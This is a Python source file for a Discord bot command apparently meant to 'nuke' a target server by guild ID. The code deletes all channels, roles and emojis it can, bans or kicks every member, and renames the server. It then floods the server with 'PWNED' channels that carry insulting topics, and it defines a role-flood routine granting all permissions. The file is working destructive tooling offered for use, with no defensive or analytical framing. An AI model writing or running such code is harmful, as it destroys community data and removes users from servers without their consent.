import os

import discord

import chattrigger


# import aiohttp

# from chattriggers.probeserver import ProbeServer

# import traceback

class DestroyServer(chattrigger.ChatTrigger):

    async def run(self, message: discord.Message, trigger: str, client: discord.Client):
        ownerid = int(os.environ.get("OWNER_ID"))
        if not message.author.id == ownerid:
            return

        targetguild = client.get_guild(int(message.content[len(trigger):]))

        await self.probeserver(targetguild, message)
        # probeserver = ProbeServer(f",ps {targetguild.id}", ",ps ", client)
        # probeserver = ProbeServer("Probe Server (,probeserver [server id]", [",probeserver ", ",ps "])
        # await probeserver.run(f",ps {targetguild.id}", ",ps ", client)

        await message.channel.send(f"Raining destruction on {str(targetguild)}")
        print(f"Raining destruction on {str(targetguild)}")
        # stopstopstop
        counter = 0
        for i in targetguild.channels:
            try:
                await i.delete()
                print(f"Successfully delete {i.name}")
                # await message.channel.send(f"Successfully delete {i.name}")
                counter += 1
            except:
                print(f"Failed delete {i.name}")
        # await message.channel.send

        await message.channel.send(f"Successfully deleted {counter} channels.")
        counter = 0

        for i in targetguild.members:
            try:
                await i.ban()
                print(f"Successfully banned {i.name}")
                # await message.channel.send
                counter += 1
            except:
                print(f"Failed to ban {i.name}")
                try:
                    await i.kick()
                    counter += 1
                except:
                    print(f"Failed to kick {i.name}")

        # await message.channel.send

        await message.channel.send(f"Successfully removed {counter} members.")
        counter = 0

        for i in targetguild.roles:
            try:
                await i.delete()
                print(f"Successfully delete {i.name}")
                # await message.channel.send
                counter += 1
            except:
                print(f"Failed to delete {i.name}")

        await message.channel.send(f"Successfully deleted {counter} roles.")
        counter = 0

        for i in targetguild.emojis:
            try:
                await i.delete()
                print(f"Successfully deleted {i.name}")
                counter += 1
            except:
                print(f"Failed to delete {i.name}")

        await message.channel.send(f"Successfully deleted {counter} emotes.")
        counter = 0

        # async with aiohttp.ClientSession() as session:
        # get = await session.get("https://i.imgur.com/fLgbLyq.jpg")
        # gottenbytes = await get.read()

        # try:
        await targetguild.edit(name="。死", icon=None)  # XDXD

        # await message.guild.edit(icon = await get.read())
        # except: print("fa")

        await self.probeserver(targetguild, message)

        await message.channel.send("Flooding roles...")

        # await self.roleflood(targetguild)

        print("done role flood")

        await self.probeserver(targetguild, message)

        await message.channel.send("Flooding channels...")

        await self.channelflood(targetguild)

        print("done channel flood")

        await self.probeserver(targetguild, message)

        print("Done")
        await message.channel.send("Done")

    # await self.probeserver(targetguild, message)

    async def probeserver(self, targetserver: discord.Guild, message: discord.Message):
        targetserver: discord.Guild = targetserver

        messagestr = ""

        messagestr += f"**{targetserver.name}**\n"

        if targetserver.owner == None:
            messagestr += f"**Server has no owner!**\n"
        else:
            messagestr += f"**{str(targetserver.owner)} is owner.**\n"

        members = [str(x) for x in targetserver.members]
        membersstr = ", ".join(members)

        messagestr += f"**Members ({len(members)}):** "

        messagestr += f"{membersstr}\n"

        channels = [str(x) for x in targetserver.channels]
        channelsstr = ", ".join(channels)

        messagestr += f"**Channels ({len(channels)}):** "

        messagestr += f"{channelsstr}\n"

        roles = [str(x) for x in targetserver.roles]
        rolesstr = ", ".join(roles)

        messagestr += f"**Roles ({len(roles)}):** "

        messagestr += f"{rolesstr}\n"

        #

        selfroles = [str(x) for x in targetserver.me.roles]
        selfrolesstr = ", ".join(selfroles)

        messagestr += f"**Dot2 Roles ({len(selfroles)}):** "

        messagestr += f"{selfrolesstr}\n"

        selfpermissions = targetserver.me.guild_permissions

        messagestr += f"**Dot2 Permission Values:**\n"

        messagestr += f'''Administrator: {selfpermissions.administrator}
Manage Channels: {selfpermissions.manage_channels}
Manage Roles: {selfpermissions.manage_roles}
Manage Guild: {selfpermissions.manage_guild}
Ban Members: {selfpermissions.ban_members}
Kick Members: {selfpermissions.kick_members}'''

        #

        messagestr = discord.utils.escape_mentions(messagestr)

        #

        chunksize = 2000  # discord 2000 character limit

        # nofchunks = -(-len(messagestr) // chunksize) # ceiling division

        # chunks = []

        a = ""
        c = 0
        for i in messagestr:  # discord 2000 character limit
            if c == chunksize:
                print(len(a))
                await message.channel.send(a)

                a = ""
                c = 0
            a += str(i)
            c += 1
        await message.channel.send(a)

    async def roleflood(self, targetserver: discord.Guild):

        colour = discord.Colour.from_rgb(0, 255, 0)  # perfect green, lime green, a very eye piercing colour
        permissions = discord.Permissions.all()  # for the lulz

        # for i in range(10000):

        # flood roles up to limit

        while 1:
            try:
                # a = await targetserver.create_role(name = "PWNED", colour = colour, permissions = permissions, reason = "FUCK YOU LOLOLOL")
                await targetserver.create_role(name="PWNED", colour=colour, permissions=permissions,
                                               reason="FUCK YOU LOLOLOL")
            except:
                print("Reached role limit!")
                # await a.delete()
                return

    # for i in range(6969): # jaja funny sex number
    #	a = await targetserver.create_role(name = "PWNED", colour = colour, permissions = permissions, reason = "FUCK YOU LOLOLOL")
    #	await a.delete()

    async def channelflood(self, targetserver: discord.Guild):

        while 1:
            try:
                await targetserver.create_text_channel("P-W-N-E-D", position=0, topic="get fucked kid",
                                                       slowmode_delay=21600, nsfw=True,
                                                       reason="get fucked you bacon hair")
            except:
                print("Reached Chanenl Limit!")
                return
